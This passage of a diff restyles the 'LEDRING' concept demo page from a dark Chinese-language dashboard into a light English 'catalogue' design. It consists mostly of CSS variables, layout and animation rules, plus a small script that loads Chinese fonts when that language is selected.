@@ -1,691 +1,755 @@
 <!doctype html>
-<html lang="zh-CN" data-theme="dark">
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>LEDRING — 概念演示 v2</title>
+<script>(function(){var q=new URLSearchParams(location.search).get("lang"),l;try{l=q||localStorage.getItem("ledring-lang")}catch(e){l=q}if(l==="zh"){document.documentElement.lang="zh-CN";document.write('<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&family=Noto+Serif+SC:wght@600;900&display=swap" rel="stylesheet">')}})()</script>
+<title>ledring — catalogue no. 417</title>
 <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600&family=Geist+Mono:wght@400;500&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wdth,wght@62..125,300..800&family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans:wght@400;500&display=swap" rel="stylesheet">
 <style>
 :root{
- --bg:#06080B;--bg-1:#0A0D11;--panel:#0D1116;--raised:#121820;--overlay:rgba(14,19,25,.78);
- --line:rgba(255,255,255,.07);--line-2:rgba(255,255,255,.12);--line-3:rgba(255,255,255,.2);
- --tx:#E9EEF3;--tx-2:#9AA6B2;--tx-3:#5C6773;--tx-4:#38414B;
- --cyan:#5FE3F5;--cyan-2:#2BC4DB;--cyan-a:rgba(95,227,245,.12);--cyan-g:rgba(95,227,245,.35);
- --calm:#4C9DFF;--proc:#F5C451;--crit:#FF5A5F;--ok:#4ADE9B;
- --s1:4px;--s2:8px;--s3:12px;--s4:16px;--s5:24px;--s6:32px;--s7:48px;
- --r1:6px;--r2:10px;--r3:14px;
- --fs:'Geist','Inter',system-ui,-apple-system,'PingFang SC','Microsoft YaHei',sans-serif;
- --fm:'Geist Mono','JetBrains Mono',ui-monospace,'SF Mono',Menlo,monospace;
- --spring:cubic-bezier(.2,.9,.25,1.12);--out:cubic-bezier(.16,1,.3,1);
- --hl:inset 0 1px 0 rgba(255,255,255,.045);
- --sh-3:0 24px 80px -12px rgba(0,0,0,.7),0 0 0 1px var(--line-2);
+ --paper:#F3F2EE;--sheet:#FBFAF7;--ink:#16181A;--ink-2:#6B6E70;--ink-3:#A3A49F;--rule:#CFCDC6;--rule-2:#E3E1DA;
+ --calm:#2F5BEA;--proc:#E8B10A;--crit:#D7261E;
+ --disp:'Archivo','Helvetica Neue',Arial,sans-serif;--mono:'IBM Plex Mono',ui-monospace,Menlo,monospace;--text:'IBM Plex Sans','Helvetica Neue',Arial,sans-serif;
+ --col:calc((100vw - 96px - 11*24px)/12);
 }
 *{box-sizing:border-box;margin:0;padding:0}
 html,body{height:100%}
-body{background:var(--bg);color:var(--tx);font:400 13px/1.55 var(--fs);letter-spacing:-.003em;overflow:hidden;-webkit-font-smoothing:antialiased}
-::selection{background:var(--cyan-a);color:var(--cyan)}
-body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;background:
- radial-gradient(900px 520px at 78% -8%,rgba(95,227,245,.075),transparent 60%),
- radial-gradient(700px 500px at 8% 110%,rgba(76,157,255,.05),transparent 60%)}
-.grain{position:fixed;inset:0;pointer-events:none;z-index:90;opacity:.05;mix-blend-mode:overlay;
- background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E")}
-.mono,.num{font-family:var(--fm);font-variant-numeric:tabular-nums;letter-spacing:0}
-.lbl{font:500 10.5px/1 var(--fm);letter-spacing:.09em;text-transform:uppercase;color:var(--tx-3)}
-h1{font:600 40px/1.05 var(--fs);letter-spacing:-.035em}
-h2{font:600 24px/1.15 var(--fs);letter-spacing:-.025em}
-h3{font:500 15px/1.3 var(--fs);letter-spacing:-.012em}
-p{color:var(--tx-2)}
-kbd{font:500 10.5px/1 var(--fm);padding:3px 5px;border-radius:4px;border:1px solid var(--line-2);background:var(--raised);color:var(--tx-2);box-shadow:inset 0 -1px 0 rgba(255,255,255,.04)}
-.btn{font:500 12.5px/1 var(--fs);color:var(--tx);background:var(--raised);border:1px solid var(--line-2);border-radius:var(--r1);height:32px;padding:0 12px;display:inline-flex;align-items:center;gap:8px;cursor:pointer;box-shadow:var(--hl);white-space:nowrap;
- transition:background .15s,border-color .15s,transform .2s var(--spring),box-shadow .15s}
-.btn:hover{background:#18202A;border-color:var(--line-3)}
-.btn:active{transform:scale(.97)}
-.btn:disabled{opacity:.5;cursor:default}
-.btn:focus-visible,a:focus-visible,[tabindex]:focus-visible{outline:none;box-shadow:0 0 0 1px var(--bg),0 0 0 3px rgba(95,227,245,.5)}
-.btn.pri{background:linear-gradient(180deg,#7DEBFA,#3FCDE3);color:#031418;border-color:transparent;box-shadow:inset 0 1px 0 rgba(255,255,255,.45),0 0 0 1px rgba(95,227,245,.4),0 6px 24px -6px rgba(95,227,245,.5)}
-.btn.pri:hover{filter:brightness(1.06)}
-.btn .k{margin-left:4px;opacity:.6;font:500 11px var(--fm)}
-#app{position:fixed;inset:0;display:grid;grid-template-columns:224px 1fr;grid-template-rows:48px 1fr;z-index:1}
-header{grid-column:1/3;display:flex;align-items:center;gap:var(--s3);padding:0 var(--s4);border-bottom:1px solid var(--line);background:rgba(6,8,11,.7);backdrop-filter:blur(16px) saturate(1.4);z-index:5}
-.brand{display:flex;align-items:center;gap:10px;font:600 13px var(--fs);letter-spacing:.16em}
-.brand .mk{width:18px;height:18px;border-radius:50%;border:2.5px solid var(--cyan);box-shadow:0 0 12px var(--cyan-g),inset 0 0 6px var(--cyan-g)}
-.crumb{color:var(--tx-3);font:500 12.5px var(--fs);display:flex;gap:8px;align-items:center}.crumb b{color:var(--tx);font-weight:500}
-.tag{font:500 10px/1 var(--fm);letter-spacing:.08em;padding:4px 7px;border-radius:4px;color:var(--proc);background:rgba(245,196,81,.08);border:1px solid rgba(245,196,81,.2)}
-.sp{flex:1}
-.search{height:30px;width:260px;border-radius:var(--r1);border:1px solid var(--line);background:rgba(255,255,255,.025);display:flex;align-items:center;gap:8px;padding:0 6px 0 10px;color:var(--tx-3);font-size:12.5px;cursor:pointer;transition:border-color .15s,background .15s}
-.search:hover{border-color:var(--line-2);background:rgba(255,255,255,.04)}
-.search span{flex:1}
-nav{border-right:1px solid var(--line);padding:var(--s3) var(--s2);display:flex;flex-direction:column;gap:1px;background:rgba(8,10,13,.6);z-index:4;position:relative}
-nav .grp{padding:var(--s4) 10px 8px}
-nav a{position:relative;z-index:1;display:flex;align-items:center;gap:10px;height:30px;padding:0 10px;border-radius:var(--r1);color:var(--tx-2);text-decoration:none;font-size:12.5px;transition:color .15s}
-nav a .n{font:500 10px var(--fm);color:var(--tx-4);width:16px}
-nav a:hover{color:var(--tx)}
-nav a.on{color:var(--tx)}nav a.on .n{color:var(--cyan)}
-nav .pill{position:absolute;left:var(--s2);right:var(--s2);height:30px;border-radius:var(--r1);background:rgba(255,255,255,.05);box-shadow:var(--hl),0 0 0 1px var(--line);transition:transform .35s var(--spring),opacity .2s;pointer-events:none;top:0}
-nav .pill::before{content:"";position:absolute;left:-8px;top:8px;bottom:8px;width:2px;border-radius:2px;background:var(--cyan);box-shadow:0 0 8px var(--cyan)}
-nav .foot{margin-top:auto;padding:var(--s3) 10px;border-top:1px solid var(--line);display:flex;flex-direction:column;gap:6px}
-main{position:relative;overflow:auto;padding:var(--s6) var(--s7) var(--s7)}
-section.view{display:none;max-width:1160px;margin:0 auto}
-section.view.on{display:block}
-.view.on .st{animation:rise .6s var(--out) both;animation-delay:calc(var(--i,0)*55ms)}
-@keyframes rise{from{opacity:0;transform:translateY(8px);filter:blur(3px)}}
-.panel{position:relative;background:linear-gradient(180deg,rgba(255,255,255,.018),rgba(255,255,255,0) 40%),var(--panel);border:1px solid var(--line);border-radius:var(--r2);padding:var(--s5);box-shadow:var(--hl),0 1px 2px rgba(0,0,0,.4)}
-.panel.hud::after{content:"";position:absolute;inset:6px;border:1px dashed rgba(255,255,255,.06);border-radius:6px;pointer-events:none}
-.ticks{position:absolute;inset:-1px;pointer-events:none}
-.ticks i{position:absolute;width:10px;height:10px;border-color:var(--cyan);border-style:solid;opacity:.75}
-.ticks i:nth-child(1){left:0;top:0;border-width:1px 0 0 1px;border-top-left-radius:var(--r2)}.ticks i:nth-child(2){right:0;top:0;border-width:1px 1px 0 0;border-top-right-radius:var(--r2)}
-.ticks i:nth-child(3){left:0;bottom:0;border-width:0 0 1px 1px;border-bottom-left-radius:var(--r2)}.ticks i:nth-child(4){right:0;bottom:0;border-width:0 1px 1px 0;border-bottom-right-radius:var(--r2)}
-.ph{display:flex;align-items:center;gap:var(--s2);margin-bottom:var(--s4)}
-.row{display:flex;gap:var(--s4)}.col{display:flex;flex-direction:column;gap:var(--s4)}
-.g2{display:grid;grid-template-columns:1fr 1fr;gap:var(--s4)}
-.vhead{display:flex;align-items:flex-end;gap:var(--s5);margin-bottom:var(--s5)}
-.vhead .ey{margin-bottom:10px}
-.vhead p{max-width:640px;margin-top:8px;font-size:13.5px}
-.bracket{font:500 11px var(--fm);letter-spacing:.08em;color:var(--cyan)}
-.code{font-family:var(--fm);font-size:11.5px;padding:1px 5px;border-radius:4px;background:rgba(255,255,255,.05);border:1px solid var(--line);color:var(--tx)}
-.led{--c:var(--calm);display:inline-flex;align-items:center;gap:8px;font:500 10.5px var(--fm);letter-spacing:.08em;text-transform:uppercase;color:var(--tx-2)}
-.led i{position:relative;width:12px;height:12px;border-radius:50%;border:2px solid var(--c);box-shadow:0 0 8px color-mix(in srgb,var(--c) 60%,transparent),inset 0 0 4px color-mix(in srgb,var(--c) 50%,transparent);animation:breathe 4s ease-in-out infinite;transition:border-color .3s,box-shadow .3s}
-.led.proc{--c:var(--proc)}.led.proc i{animation:spinr 1.1s linear infinite;border-right-color:transparent}
-.led.crit{--c:var(--crit)}.led.crit i{animation:none}
-@keyframes breathe{50%{box-shadow:0 0 2px var(--c);opacity:.65}}
-@keyframes spinr{to{transform:rotate(360deg)}}
-.pill-led{display:inline-flex;align-items:center;height:26px;padding:0 10px;border-radius:13px;border:1px solid var(--line);background:rgba(255,255,255,.02)}
-#boot{position:fixed;inset:0;z-index:80;background:var(--bg);display:flex;align-items:center;justify-content:center;flex-direction:column;gap:var(--s5);transition:opacity .5s,filter .5s}
-#boot.gone{opacity:0;filter:blur(6px);pointer-events:none}
-.bring{width:72px;height:72px;border-radius:50%;border:3px solid var(--cyan);border-right-color:transparent;box-shadow:0 0 40px var(--cyan-a),inset 0 0 16px var(--cyan-a);animation:spinr 1.6s linear infinite}
-#bootlog{font:12px/1.9 var(--fm);color:var(--tx-3);width:440px;min-height:136px}
-#bootlog .ok{color:var(--cyan)}
-.bar{height:1px;background:var(--line-2);width:440px;overflow:hidden}.bar b{display:block;height:100%;width:0;background:var(--cyan);box-shadow:0 0 8px var(--cyan);transition:width .3s var(--out)}
-.hero{display:grid;grid-template-columns:1.45fr 1fr;gap:var(--s4)}
-.greet{font:400 17px/1.6 var(--fs);color:var(--tx-2);min-height:82px;max-width:560px;letter-spacing:-.01em}
-.greet .cur{display:inline-block;width:2px;height:18px;background:var(--cyan);vertical-align:-3px;margin-left:2px;box-shadow:0 0 6px var(--cyan);animation:blink 1s steps(1) infinite}
-@keyframes blink{50%{opacity:0}}
-.menu{display:flex;flex-direction:column;gap:6px;margin-top:var(--s5)}
-.mi{display:flex;align-items:center;gap:var(--s3);height:44px;padding:0 var(--s3) 0 var(--s3);border-radius:var(--r1);border:1px solid var(--line);background:rgba(255,255,255,.015);cursor:pointer;color:var(--tx);font-size:13px;transition:background .15s,border-color .15s,transform .25s var(--spring)}
-.mi:hover{background:rgba(255,255,255,.04);border-color:var(--line-2);transform:translateX(2px)}
-.mi .ic{width:22px;height:22px;border-radius:5px;display:grid;place-items:center;background:var(--raised);border:1px solid var(--line-2);font:500 10px var(--fm);color:var(--tx-2)}
-.mi.pri{border-color:rgba(95,227,245,.3);background:linear-gradient(90deg,rgba(95,227,245,.09),rgba(95,227,245,.01))}
-.mi.pri .ic{background:var(--cyan);color:#031418;border-color:transparent;box-shadow:0 0 12px var(--cyan-g)}
-.mi .sp+span{font:500 11px var(--fm);color:var(--tx-3)}
-.kpis{display:grid;grid-template-columns:repeat(3,1fr);border-top:1px solid var(--line);margin:var(--s5) calc(-1*var(--s6)) 0}
-.kpi{padding:var(--s4) var(--s6) 0}.kpi+.kpi{border-left:1px solid var(--line)}
-.kpi .v{font:500 26px/1 var(--fm);letter-spacing:-.04em;margin-top:10px}
-.kpi .v small{font-size:13px;color:var(--tx-3);letter-spacing:0}
-.kpi .sub{font:400 11px var(--fm);color:var(--tx-3);margin-top:12px}
-.spark{display:flex;gap:2px;align-items:flex-end;height:22px;margin-top:10px}
-.spark i{flex:1;border-radius:1px;background:var(--tx-4)}
-.spark i.ok{background:var(--cyan-2);opacity:.7}.spark i.bad{background:var(--crit)}
-.stat{display:flex;justify-content:space-between;align-items:center;height:36px;border-bottom:1px solid var(--line);font-size:12.5px;color:var(--tx-2)}
-.stat:last-child{border:0}.stat .mono{color:var(--tx);font-size:12px}
-.dots{display:grid;grid-template-columns:repeat(6,1fr);gap:6px}
-.dots span{height:30px;border-radius:5px;border:1px dashed var(--line-2);display:grid;place-items:center;font:500 10px var(--fm);color:var(--tx-4);transition:all .3s}
-.dots span.on{border-style:solid;border-color:rgba(95,227,245,.35);color:var(--cyan);background:var(--cyan-a)}
-.flowwrap{position:relative;height:500px;border-radius:var(--r2);overflow:hidden;background:radial-gradient(circle at 1px 1px,rgba(255,255,255,.06) 1px,transparent 0) 0 0/20px 20px,var(--bg-1);border:1px solid var(--line)}
-#flowsvg{width:100%;height:100%;display:block;transition:opacity .3s}
-.fnode{cursor:pointer;outline:none}
-.fnode rect.b{fill:#0E141A;stroke:var(--line-2);stroke-width:1;transition:stroke .3s,fill .3s}
-.fnode .t{font:500 11px var(--fm);fill:var(--tx-3);transition:fill .3s}
-.fnode .k{font:500 8.5px var(--fm);fill:var(--tx-4);letter-spacing:.1em}
-.fnode .dot{fill:var(--tx-4);transition:fill .3s}
-.fnode.lit rect.b{fill:#0C1A20;stroke:rgba(95,227,245,.55)}
-.fnode.lit .t{fill:var(--tx)}.fnode.lit .dot{fill:var(--cyan)}.fnode.lit .k{fill:rgba(95,227,245,.6)}
-.fnode.lock rect.b{stroke-dasharray:3 3;fill:rgba(10,13,17,.8)}
-.fnode.fail .dot{fill:var(--crit)}.fnode.fail.lit rect.b{stroke:rgba(255,90,95,.6);fill:#1A0F12}.fnode.fail.lit .k{fill:rgba(255,90,95,.7)}
-.fnode:hover rect.b,.fnode:focus-visible rect.b{stroke:var(--line-3)}.fnode.lit:hover rect.b{stroke:var(--cyan)}
-.fnode .halo{fill:none;stroke:var(--cyan);opacity:0;transition:opacity .25s}
-.fnode.sel .halo{opacity:.35}.fnode.sel rect.b{stroke:var(--cyan)}
-.fedge{fill:none;stroke:rgba(255,255,255,.13);stroke-width:1;stroke-dasharray:2 4}
-.fedge.lit{stroke:url(#eg);stroke-width:1.5;stroke-dasharray:none;filter:url(#glow)}
-.fedge.lit.bad{stroke:#FF7A7E}
-.pct{font:500 10px var(--fm);fill:var(--tx-3)}.pct.lit{fill:var(--cyan)}
-.pctbg{fill:var(--bg-1)}
-.pulse{fill:#CFFAFF;filter:url(#glow)}
-.legend{position:absolute;left:var(--s4);bottom:var(--s4);display:flex;gap:var(--s4);font:500 10.5px var(--fm);color:var(--tx-3);padding:7px 12px;border-radius:var(--r1);background:var(--overlay);border:1px solid var(--line);backdrop-filter:blur(10px)}
-.legend span{display:flex;align-items:center;gap:6px}
-.legend i{width:14px;height:0;border-top:1.5px solid var(--cyan)}.legend .l2 i{border-top:1px dashed var(--tx-3)}.legend .l3 i{border-color:var(--crit)}
-.scanline{position:absolute;left:0;right:0;height:80px;top:-80px;background:linear-gradient(180deg,transparent,rgba(95,227,245,.07) 90%,rgba(95,227,245,.45));pointer-events:none;z-index:2}
-.scan .scanline{animation:scan .7s var(--out)}
-@keyframes scan{to{top:100%}}
-.kv{display:grid;grid-template-columns:64px 1fr;gap:10px 12px;font:12px var(--fm)}
-.kv b{color:var(--tx-3);font-weight:400;font-size:11px}.kv span{color:var(--tx);word-break:break-all}
-.empty{display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;gap:10px;padding:var(--s6) var(--s4);color:var(--tx-3);font-size:12.5px}
-.empty .gl{width:44px;height:44px;border-radius:12px;border:1px dashed var(--line-3);display:grid;place-items:center;color:var(--tx-2);font:500 15px var(--fm);background:rgba(255,255,255,.02)}
-.empty b{color:var(--tx);font-weight:500;font-size:13px}
-.skel{position:absolute;inset:0;display:none}
-.loading .skel{display:block}.loading #flowsvg{opacity:0}
-.sk{height:40px;width:17%;border-radius:8px;position:absolute;background:linear-gradient(90deg,rgba(255,255,255,.03),rgba(255,255,255,.08),rgba(255,255,255,.03));background-size:200% 100%;animation:shim 1.2s linear infinite}
-@keyframes shim{to{background-position:-200% 0}}
-.gauge{position:relative;width:300px;height:180px;margin:var(--s2) auto 0}
-.gauge svg{width:100%;height:100%;overflow:visible}
-.gval{position:absolute;bottom:0;left:0;right:0;text-align:center;font:500 56px/1 var(--fm);letter-spacing:-.05em}
-.gval small{display:block;font:500 10px var(--fm);letter-spacing:.1em;color:var(--tx-3);margin-top:6px}
-.pops{position:absolute;top:40px;left:0;right:0;height:0}
-.pop{position:absolute;left:50%;transform:translateX(-50%);font:500 12px var(--fm);animation:popup 1s var(--out) forwards;white-space:nowrap;padding:3px 8px;border-radius:4px}
-.pop.up{color:var(--crit);background:rgba(255,90,95,.1);border:1px solid rgba(255,90,95,.25)}.pop.down{color:var(--calm);background:rgba(76,157,255,.1);border:1px solid rgba(76,157,255,.25)}
-@keyframes popup{0%{opacity:0;top:20px}20%{opacity:1}100%{opacity:0;top:-34px}}
-.steps{font:12px/1.4 var(--fm)}
-.steps div{display:grid;grid-template-columns:30px 1fr 64px;gap:10px;align-items:center;height:36px;padding:0 10px;border-radius:6px;color:var(--tx-4);transition:color .3s,background .3s}
-.steps div.done{color:var(--tx-2)}.steps div.cur{background:rgba(95,227,245,.06);color:var(--tx);box-shadow:inset 0 0 0 1px rgba(95,227,245,.2)}
-.steps div span:last-child{text-align:right}
-.d-up{color:var(--crit)}.d-dn{color:var(--calm)}
-.subs{display:grid;grid-template-columns:repeat(4,1fr);gap:var(--s2);margin-top:var(--s5)}
-.subs div{border:1px solid var(--line);border-radius:6px;padding:8px 10px;font:500 9.5px var(--fm);color:var(--tx-3);letter-spacing:.08em}
-.subs div b{display:block;color:var(--tx);font-size:13px;margin-top:4px;font-weight:500;letter-spacing:0}
-.tb{display:grid;grid-template-columns:190px 1fr 72px 104px;gap:var(--s5);align-items:center;height:50px;border-bottom:1px solid var(--line);font:12px var(--fm)}
-.tb:last-child{border:0}
-.tb.h{height:36px;color:var(--tx-3);font-size:10px;letter-spacing:.08em}
-.track{height:6px;border-radius:3px;background:rgba(255,255,255,.05);position:relative;box-shadow:inset 0 0 0 1px var(--line)}
-.track b{position:absolute;inset:0 auto 0 0;border-radius:3px;background:linear-gradient(90deg,var(--cyan-2),var(--cyan));box-shadow:0 0 10px rgba(95,227,245,.35);transition:width .9s var(--spring)}
-.track i{position:absolute;top:-6px;bottom:-6px;width:1px;background:var(--tx-2)}
-.verdict{font:500 10.5px var(--fm);letter-spacing:.06em;padding:4px 8px;border-radius:4px;justify-self:start}
-.v-allow{color:var(--calm);background:rgba(76,157,255,.1)}.v-ask{color:var(--proc);background:rgba(245,196,81,.1)}.v-never{color:var(--crit);background:rgba(255,90,95,.1)}
-.diff{font:12px/1.75 var(--fm);background:var(--bg-1);padding:var(--s3) var(--s4);border:1px solid var(--line);border-radius:var(--r1);color:var(--tx-2);min-height:230px}
-.diff .a{color:var(--ok);background:rgba(74,222,155,.06);display:inline-block;width:100%}.diff .r{color:var(--crit);background:rgba(255,90,95,.06);display:inline-block;width:100%}
-.chip{display:inline-flex;height:26px;align-items:center;padding:0 10px;border:1px solid var(--line-2);border-radius:13px;font:11px var(--fm);margin:0 6px 6px 0;color:var(--tx-2)}
-.plate{width:420px;flex:none;position:relative;border-radius:var(--r3);padding:var(--s5);background:linear-gradient(135deg,rgba(95,227,245,.12),transparent 40%),linear-gradient(180deg,#0F161C,#0A0E12);border:1px solid rgba(95,227,245,.25);
- box-shadow:var(--hl),0 30px 80px -20px rgba(95,227,245,.18),0 0 0 6px rgba(95,227,245,.03)}
-.plate::before{content:"";position:absolute;inset:0;border-radius:inherit;background:repeating-linear-gradient(0deg,rgba(255,255,255,.015) 0 1px,transparent 1px 3px);pointer-events:none}
-.plate .model{font:500 56px/1 var(--fm);letter-spacing:-.05em;margin-top:var(--s5);background:linear-gradient(180deg,#fff,#8FEAF7);-webkit-background-clip:text;background-clip:text;color:transparent}
-.plate .spec{display:grid;grid-template-columns:64px 1fr;gap:10px;font:12px var(--fm);margin-top:var(--s5);padding-top:var(--s4);border-top:1px solid var(--line)}
-.plate .spec b{color:var(--tx-3);font-weight:500;font-size:10px;letter-spacing:.1em;padding-top:1px}
-.risk i{display:inline-block;width:16px;height:6px;border-radius:2px;background:rgba(255,255,255,.08);margin-right:3px}.risk i.on{background:var(--proc);box-shadow:0 0 6px rgba(245,196,81,.5)}
-.plate .foot{margin-top:var(--s5);padding-top:var(--s3);border-top:1px dashed var(--line-2);font:10px var(--fm);color:var(--tx-3);letter-spacing:.1em;display:flex;justify-content:space-between}
-.unbox{animation:unbox .9s var(--spring)}
-@keyframes unbox{from{opacity:0;transform:perspective(900px) rotateX(14deg) translateY(24px) scale(.96);filter:blur(6px)}}
-pre{font:11.5px/1.7 var(--fm);white-space:pre-wrap;color:var(--tx-2)}
-pre .k{color:var(--cyan)}pre .s{color:#C3E88D}
-
-.rr{display:grid;grid-template-columns:80px 120px 1fr 160px 32px 16px;gap:var(--s4);align-items:center;height:40px;padding:0 var(--s2);margin:0 calc(-1*var(--s2));border-radius:var(--r1);border-top:1px solid var(--line);font-size:12.5px;color:var(--tx-2);cursor:pointer;transition:background .15s}
-.rr:first-child{border-top:0}.rr:hover{background:rgba(255,255,255,.03);color:var(--tx)}
-.dbar{height:4px;border-radius:2px;background:rgba(255,255,255,.06);overflow:hidden}.dbar b{display:block;height:100%;border-radius:2px}
-.wallbox{position:relative;height:300px;border-radius:var(--r2);overflow:hidden;border:1px solid var(--line);background:radial-gradient(circle at 1px 1px,rgba(255,255,255,.05) 1px,transparent 0) 0 0/20px 20px,var(--bg-1)}
-.lane{position:absolute;left:4%;right:4%;top:50%;height:1px;background:linear-gradient(90deg,transparent,var(--line-3) 20%,var(--line-3) 80%,transparent)}
-.wall{position:absolute;top:0;bottom:0;right:0;width:0;overflow:hidden;transition:width .7s var(--spring);
- background:linear-gradient(90deg,rgba(255,90,95,.5),rgba(200,20,30,.32) 30%,rgba(120,8,14,.26));box-shadow:-1px 0 0 rgba(255,140,140,.9),-30px 0 70px -10px rgba(255,60,60,.55)}
-.wall::before{content:"";position:absolute;inset:0;background:linear-gradient(rgba(255,255,255,.07) 1px,transparent 1px) 0 0/100% 10px,linear-gradient(90deg,rgba(255,255,255,.07) 1px,transparent 1px) 0 0/10px 100%}
-.wall.up{width:40%}
-.wall .wtxt{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;font:500 13px var(--fm);letter-spacing:.4em;color:#fff;opacity:0;transition:opacity .4s .35s}
-.wall .wtxt small{font-size:10px;letter-spacing:.15em;opacity:.65}
-.wall.up .wtxt{opacity:1}
+body{background:var(--paper);color:var(--ink);font:400 14px/1.5 var(--text);-webkit-font-smoothing:antialiased;overflow-x:hidden}
+::selection{background:var(--ink);color:var(--paper)}
+a{color:inherit}
+.mono{font-family:var(--mono);font-size:12px;letter-spacing:0;font-variant-numeric:tabular-nums}
+.cap{font-family:var(--mono);font-size:11px;color:var(--ink-2)}
+.cap b{color:var(--ink);font-weight:500}
+.cond{font-family:var(--disp);font-stretch:68%;font-weight:600;text-transform:uppercase;letter-spacing:.005em}
+.wide{font-family:var(--disp);font-stretch:125%;font-weight:700;letter-spacing:-.02em}
+button{font:500 13px var(--text);color:var(--ink);background:var(--sheet);border:1px solid var(--ink);border-radius:0;height:34px;padding:0 14px;cursor:pointer;display:inline-flex;align-items:center;gap:10px;transition:background .12s,color .12s}
+button:hover{background:var(--ink);color:var(--paper)}
+button:active{transform:translateY(1px)}
+button:focus-visible,[tabindex]:focus-visible,a:focus-visible{outline:2px solid var(--calm);outline-offset:2px}
+button.solid{background:var(--ink);color:var(--paper)}button.solid:hover{background:#000}
+button:disabled{opacity:.4;pointer-events:none}
+/* masthead */
+header{display:grid;grid-template-columns:270px 1fr auto;align-items:end;gap:24px;padding:20px 48px 0;border-bottom:1px solid var(--ink);background:var(--paper);position:sticky;top:0;z-index:5}
+.mark{padding-bottom:14px;line-height:1}
+.mark b{font:700 22px/1 var(--disp);font-stretch:110%;letter-spacing:-.03em;display:block}
+.mark span{font:400 11px var(--mono);color:var(--ink-2)}
+nav{display:flex;gap:0}
+nav a{display:flex;flex-direction:column;gap:6px;padding:0 18px 12px;text-decoration:none;color:var(--ink-2);border-bottom:2px solid transparent;margin-bottom:-1px;transition:color .12s}
+nav a svg{width:48px;height:36px;stroke:currentColor;fill:none;stroke-width:1}
+nav a span{font:400 12px/1 var(--text);white-space:nowrap}
+nav a span i{font-style:normal;font-family:var(--mono);font-size:10px;margin-right:5px;color:var(--ink-3)}
+nav a:hover{color:var(--ink)}
+nav a.on{color:var(--ink);border-bottom-color:var(--ink)}
+.hr{display:flex;gap:16px;align-items:center;padding-bottom:14px}
+.kbd{font:400 11px var(--mono);border:1px solid var(--rule);padding:3px 6px;color:var(--ink-2);background:var(--sheet);cursor:pointer}
+.kbd:hover{border-color:var(--ink);color:var(--ink)}
+/* LED */
+.led{--c:var(--calm);display:inline-flex;align-items:center;gap:8px;font:500 11px var(--mono);text-transform:lowercase}
+.led i{width:13px;height:13px;border-radius:50%;border:3px solid var(--c);flex:none}
+.led.proc{--c:var(--proc)}.led.proc i{animation:spin 1.2s linear infinite;border-right-color:transparent}
+.led.crit{--c:var(--crit)}
+@keyframes spin{to{transform:rotate(360deg)}}
+/* page grid */
+main{padding:40px 48px 80px}
+.view{display:none}.view.on{display:block}
+.g{display:grid;grid-template-columns:repeat(12,1fr);column-gap:24px}
+.idx{grid-column:1/3;padding-top:6px}
+.idx .n{font:600 72px/0.8 var(--disp);font-stretch:62%;letter-spacing:-.01em}
+.idx .cap{display:block;margin-top:12px;max-width:150px}
+.ttl{grid-column:3/10}
+.ttl h1{font:600 64px/.92 var(--disp);font-stretch:66%;text-transform:uppercase;letter-spacing:-.005em}
+.ttl p{max-width:620px;margin-top:14px;color:var(--ink-2);font-size:14.5px}
+.ttl p b{color:var(--ink);font-weight:500}
+.act{grid-column:10/13;display:flex;justify-content:flex-end;align-items:flex-end;gap:8px}
+.head{margin-bottom:36px;padding-bottom:24px;border-bottom:1px solid var(--ink)}
+code,.code{font:400 12.5px var(--mono);background:var(--rule-2);padding:0 4px}
+.sheet{background:var(--sheet);border:1px solid var(--ink)}
+.fig{margin-top:10px;display:flex;justify-content:space-between}
+.rule{border-top:1px solid var(--rule)}
+table{border-collapse:collapse;width:100%}
+td,th{text-align:left;font-weight:400;padding:9px 0;border-bottom:1px solid var(--rule);vertical-align:top}
+th{font:400 11px var(--mono);color:var(--ink-2);border-bottom:1px solid var(--ink)}
+td.k{font:400 11px var(--mono);color:var(--ink-2);width:110px;padding-top:11px}
+td.m{font:400 12.5px var(--mono)}
+.empty{padding:28px 0;color:var(--ink-2);font-size:13px;border-top:1px dashed var(--ink-3);border-bottom:1px dashed var(--ink-3)}
+.empty b{display:block;color:var(--ink);font-weight:500;margin-bottom:2px}
+/* home */
+.hero{display:grid;grid-template-columns:repeat(12,1fr);column-gap:24px;align-items:start}
+.hero .big{grid-column:1/9}
+.hero .big .cap{display:block;margin-bottom:22px}
+.hero h1{font:600 84px/.86 var(--disp);font-stretch:64%;text-transform:uppercase;letter-spacing:-.01em}
+.hero h1 em{font-style:normal;color:var(--crit)}
+.greet{font:400 17px/1.5 var(--text);max-width:560px;margin-top:18px;min-height:52px}
+.greet .cur{display:inline-block;width:8px;height:16px;background:var(--ink);vertical-align:-2px;margin-left:3px;animation:bl 1s steps(1) infinite}
+@keyframes bl{50%{opacity:0}}
+.hero .art{grid-column:9/13;position:relative}
+.ringdraw{width:100%;height:auto;display:block}
+.ringdraw .ln{stroke:var(--ink);fill:none;stroke-width:1}
+.ringdraw .th{stroke:var(--ink-3);fill:none;stroke-width:.75}
+.ringdraw text{font:400 10px var(--mono);fill:var(--ink-2)}
+.ringdraw .ledc{fill:none;stroke-width:9;transition:stroke .4s}
+.cat{margin-top:28px;border-top:1px solid var(--ink)}
+.ci{display:grid;grid-template-columns:repeat(12,1fr);column-gap:24px;align-items:baseline;padding:11px 0 9px;border-bottom:1px solid var(--rule);text-decoration:none;cursor:pointer;transition:background .12s}
+.ci:hover{background:var(--sheet)}
+.ci .no{grid-column:1/2;font:400 12px var(--mono);color:var(--ink-2)}
+.ci .nm{grid-column:2/6;font:600 26px/1 var(--disp);font-stretch:70%;text-transform:uppercase}
+.ci .ds{grid-column:6/11;color:var(--ink-2);font-size:13.5px}
